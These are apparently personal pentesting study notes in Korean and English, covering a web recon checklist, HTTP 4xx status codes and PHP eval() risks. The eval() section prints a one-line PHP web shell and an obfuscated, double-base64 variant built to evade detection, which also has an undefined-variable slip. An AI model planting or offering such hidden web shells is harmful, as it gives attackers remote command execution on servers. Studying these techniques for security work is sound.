---
title: Metasploit2
tags: metasploit hacking
key: page-metasploit
cover: /assets/cover/metasploit.png
mathjax: true
mathjax_autoNumber: true
---

## Index checks
1. /robots.txt
1. /sitemap.xml
1. /crossdomain.xml
1. /clientaccesspolicy.xml
1. /.well-known/
1. Check also comments in the main and secondary pages.

# 400 Error
1. 400 Bad Request로써, 요청 실패-문법상 오류가 있어서 서버가 요청 사항을 이해하지 못함
1. 401 Unauthorized, 이 요청은 인증이 필요하다. 서버는 로그인이 필요한 페이지에 대해 이 요청을 제공할 수 있다. 상태 코드 이름이 권한 없음(Unauthorized)으로 되어 있지만 실제 뜻은 인증 안됨(Unauthenticated)에 더 가깝다.
1. 403 Forbidden, 서버가 요청을 거부하고 있다. 예를 들자면, 사용자가 리소스에 대한 필요 권한을 갖고 있지 않다. (401은 인증 실패, 403은 인가 실패라고 볼 수 있음)
1. 404 Not Found, 문서를 찾을 수 없음->클라이언트가 요청한 문서를 찾지 못한 경우에 발생함 (URL을 잘 살펴보기)
1. 405 Method not allowed, 메소드 허용 안됨-> Request 라인에 명시된 메소드를 수행하기 위한 해당 자원의 이용이 허용되지 않았을 경우 발생함.    (페이지는 존재하나, 그걸 못보게 막거나 리소스를 허용안함)
1. 415, 지원되지 않는 형식으로 클라이언트가 요청을 해서 서버가 요청에 대한 승인을 거부한 오류를 의미한다. (ContentType,Content Encoding 데이터를 확인할 필요가 있다.)

# PHP eval()
* eval()함수는 () 안에 있는 것을 실행시키는 것을 의미한다. 따라서 안에 해커가 exploit할 수 있는 확률이 매우 높다.

UUdWMllXd 29KRjlRVDFOVVd5ZDBaWE4wSjEw cE93P T0=
@eval($_POST['test']);

<?php 
$oskl2="UUdWMllXd";
$gkst3="29KRjlRVDFOVVd5ZDBaWE4wSjEw";
$hbkw1="cE93P";
$rcxh1="T0=";
$strreplace = str_replace("ct7","","str_replace");
$base64_decode = $strreplace("gd2", "", "base64_decode");
$create_function = $strreplace("cgs1","","create_function");
$safm1 = $create_function('', $base64_decode($base64_decode($str_replace("#;*,.", "", $oskl2.$gkst3.$hbkw1.$rcxh1))));
$safm1();
?>

## References
* https://book.hacktricks.xyz/pentesting/pentesting-web[https://book.hacktricks.xyz/pentesting/pentesting-web]